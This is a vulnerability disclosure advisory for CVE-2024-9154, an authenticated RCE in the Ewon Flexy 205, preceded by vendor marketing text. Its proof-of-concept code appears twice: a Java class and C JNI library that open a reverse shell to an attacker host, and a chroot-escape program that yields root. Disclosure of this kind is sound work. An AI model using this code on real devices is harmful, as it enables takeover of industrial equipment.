###

## We make industrial equipment communicate

##### HMS stands for Hardware Meets Software™. By enabling industrial equipment (hardware) to communicate and share information with software and systems, our customers increase productivity and sustainability.

HMS Networks was founded in 1988 in Halmstad, Sweden where you still find our head office. Today, millions of industrial devices all over the world use HMS products to get connected.

Since April 2024, Red Lion Controls is a member of the HMS Group.

##### Our customers — makers and users

Our playing field is called Industrial ICT (Information and Communication Technology). Here, we help both makers and users of industrial equipment.

* **Makers** are, for example, manufacturers of drives, robots, air conditioning units, vehicles, gensets or other machines or devices. Makers turn to HMS solutions to get their products connected.
* **Users** are, for example, factory owners, system integrators or building caretakers who use industrial equipment. Users turn to HMS solutions to enable communication and information sharing.

# Authenticated Remote Code Execution in Ewon Flexy 205

The Ewon Flexy 205 is vulnerable to an authenticated remote code execution (RCE) vulnerability. This flaw allows attackers with valid credentials to execute arbitrary commands on the device.

## Vendor description

âHMS stands for Hardware Meets Softwareâ¢. By enabling industrial equipment (hardware) to communicate and share information with software and systems, our customers increase productivity and sustainability.

HMS Networks was founded in 1988 in Halmstad, Sweden where you still find our head office. Today, millions of industrial devices all over the world use HMS products to get connected. […].

We enable industrial hardware to meet IoT software â liberating data from machines for processing. The result? Increased productivity and sustainability for our customers. […]â

Source:<https://www.hms-networks.com/about-hms/>

### Vulnerable versions

Ewon Flexy 205 / v14.8s0 (#2633)

#### Vulnerability overview

1) Authenticated Remote Code Execution (CVE-2024-9154)

It is possible to gain root access to the machine through the possibility to run Java applications on the machine. Initial administration access to the machine is necessary.

#### Proof of Concept

##### 1) Authenticated Remote Code Execution (CVE-2024-9154)

After initial access to the machine via the web interface and ftp is possible, we can then upload Java applications (.jar) through FTP. These can then be executed through calling the corresponding API endpoint:

```
http://<IP>/rcgi.bin/jvmCmd?cmd=start&runCmd=%20-heapsize%205M%20-classpath%20/usr/<application_name>.jar%20-emain%20<java_classname>
```

The Java application gets executed in its own sandbox, without permissions to write new files or access any system files. This can be circumvented by using a shared library written in C. The Java application’s source code was the following:

```
public class SimpleRequester {
static {
System.setProperty("java.library.path", "/usr/lib");
System.out.println(System.getProperty("java.library.path"));
System.loadLibrary("reverse_shell");
}
private native void open_reverse_shell(String ip, int port);
public static void main(String[] args) {
SimpleRequester requester = new SimpleRequester();
String serverIp = "<attacker_IP>";
int serverPort = 6666;
try {
requester.open_reverse_shell(serverIp, serverPort);
} catch (Exception e) {
System.out.println("Error: " + e.getMessage());
}
}
}
```

This code basically only loaded the shared library and called a certain function of it with the IP and port of our attack machine, waiting for a connection. Then the following C code was written for the shared library:

```
#include <jni.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <string.h>
#include <errno.h>
#include <limits.h>
void make_busybox_executable() {
if (chmod("./busybox", 0755) < 0) {
perror("chmod");
}
}void start_busybox_shell(int sockfd) {
dup2(sockfd, STDIN_FILENO);
dup2(sockfd, STDOUT_FILENO);
dup2(sockfd, STDERR_FILENO);
execl("./busybox", "sh", NULL);
perror("execl");
close(sockfd);
}
JNIEXPORT void JNICALL Java_SimpleRequester_open_1reverse_1shell(JNIEnv *env, jobject obj, jstring ip, jint port) {
const char *ip_address = (*env)->GetStringUTFChars(env, ip, NULL);
int sockfd;
struct sockaddr_in serv_addr;
sockfd = socket(AF_INET, SOCK_STREAM, 0);
if (sockfd < 0) {
perror("socket");
(*env)->ReleaseStringUTFChars(env, ip, ip_address);
exit(1);
}
serv_addr.sin_family = AF_INET;
serv_addr.sin_port = htons(port);
inet_pton(AF_INET, ip_address, &serv_addr.sin_addr);
if (connect(sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
perror("connect");
close(sockfd);
(*env)->ReleaseStringUTFChars(env, ip, ip_address);
exit(1);
} make_busybox_executable(); start_busybox_shell(sockfd); close(sockfd);
(*env)->ReleaseStringUTFChars(env, ip, ip_address);
}
```

The shared library basically took a static shell binary, which we uploaded via FTP, made it executable and started a reverse shell with the given IP and port through the static shell binary. This allowed a reverse connection to the attacking machine.

As the Java application is running in a “sandbox”, which is using a chroot to a folder without any binaries and just the files from the user’s home directory, it was then possible to use another C binary to escape this chroot and become root user of the whole machine. The escape code was the following:

```
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>
int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/sh");
}
```

#### Solution

None.

#### Workaround

Restrict network access to the device.

#### Recommendation

Regardless to the current state of the vulnerability, CyberDanube recommends customers from Ewon Flexy to upgrade the firmware to the latest version available. Furthermore, a full security review by professionals is recommended.

Vulnerable versions
-------------------------------------------------------------------------------
Ewon Flexy 205 / v14.8s0 (#2633)

Vulnerability overview
-------------------------------------------------------------------------------
1) Authenticated Remote Code Execution (CVE-2024-9154)
It is possible to gain root access to the machine through the possibility to
run Java applications on the machine. Initial administration access to the
machine is necessary.

Proof of Concept
-------------------------------------------------------------------------------
1) Authenticated Remote Code Execution (CVE-2024-9154)
After initial access to the machine via the web interface and ftp is possible,
we can then upload Java applications (.jar) through FTP. These can then be
executed through calling the corresponding API endpoint:
===============================================================================
http://<IP>/rcgi.bin/jvmCmd?cmd=start&runCmd=%20-heapsize%205M%20-classpath%20/usr/<application_name>.jar%20-emain%20<java_classname>
===============================================================================

The Java application gets executed in its own sandbox, without permissions to
write new files or access any system files. This can be circumvented by using
a shared library written in C. The Java application's source code was the
following:

public class SimpleRequester {

    static {
        System.setProperty("java.library.path", "/usr/lib");
        System.out.println(System.getProperty("java.library.path"));

        System.loadLibrary("reverse_shell");
    }

    private native void open_reverse_shell(String ip, int port);

    public static void main(String[] args) {

        SimpleRequester requester = new SimpleRequester();
        String serverIp = "<attacker_IP>";
        int serverPort = 6666;

        try {
            requester.open_reverse_shell(serverIp, serverPort);
        } catch (Exception e) {
            System.out.println("Error: " + e.getMessage());
        }
    }
}

This code basically only loaded the shared library and called a certain
function of it with the IP and port of our attack machine, waiting for a
connection. Then the following C code was written for the shared library:

===============================================================================
#include <jni.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <string.h>
#include <errno.h>
#include <limits.h>
void make_busybox_executable() {
    if (chmod("./busybox", 0755) < 0) {
        perror("chmod");
    }
}void start_busybox_shell(int sockfd) {
    dup2(sockfd, STDIN_FILENO);
    dup2(sockfd, STDOUT_FILENO);
    dup2(sockfd, STDERR_FILENO);
    execl("./busybox", "sh", NULL);
    perror("execl");
    close(sockfd);
}

JNIEXPORT void JNICALL Java_SimpleRequester_open_1reverse_1shell(JNIEnv *env, jobject obj, jstring ip, jint port) {
    const char *ip_address = (*env)->GetStringUTFChars(env, ip, NULL);
    int sockfd;
    struct sockaddr_in serv_addr;
    sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("socket");
        (*env)->ReleaseStringUTFChars(env, ip, ip_address);
        exit(1);
    }
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(port);
    inet_pton(AF_INET, ip_address, &serv_addr.sin_addr);
    if (connect(sockfd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) < 0) {
        perror("connect");
        close(sockfd);
        (*env)->ReleaseStringUTFChars(env, ip, ip_address);
        exit(1);
    }    make_busybox_executable();    start_busybox_shell(sockfd);    close(sockfd);
    (*env)->ReleaseStringUTFChars(env, ip, ip_address);
}
===============================================================================
The shared library basically took a static shell binary, which we uploaded via
FTP, made it executable and started a reverse shell with the given IP and port
through the static shell binary. This allowed a reverse connection to the
attacking machine.

As the Java application is running in a "sandbox", which is using a chroot to a
folder without any binaries and just the files from the user's home directory,
it was then possible to use another C binary to escape this chroot and become
root user of the whole machine. The escape code was the following:

#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

int main(void)
{
    mkdir("chroot-dir", 0755);
    chroot("chroot-dir");
    for(int i = 0; i < 1000; i++) {
        chdir("..");
    }
    chroot(".");
    system("/bin/sh");
}

===============================================================================

Solution
-------------------------------------------------------------------------------
None.

Workaround
-------------------------------------------------------------------------------
Restrict network access to the device.

Recommendation
-------------------------------------------------------------------------------
Regardless to the current state of the vulnerability, CyberDanube recommends
customers from Ewon Flexy to upgrade the firmware to the latest version
available. Furthermore, a full security review by professionals is recommended.

Contact Timeline
-------------------------------------------------------------------------------
2024-09-26: Contacting HMS Networks via hms-csrt () hms-networks com.
2024-09-30: HMS Networks representative replies they will investigate.
2024-10-21: Asked for an update.
2024-10-22: Contact stated, that the vulnerability is not relevant, because the
            firmware can be downgraded with firmware update permissions and the
            device can be rooted anyway by doing so.
            Asked contact if firmware downgrades are required. Stated, that
            such downgrades are considered as vulnerability too (CWE-1328);
            No answer.
2024-11-11: Asked for a time-line to fix the vulnerability.
2024-11-11: Contact stated, that only the own intellectual property is exposed
            and that it can be extracted from old vulnerable devices.
            Therefore, it is considered as low priority risk.
2024-12-12: Informed vendor, that the advisory will be published on 2024-12-19.
2024-12-19: Public disclosure of security advisory.
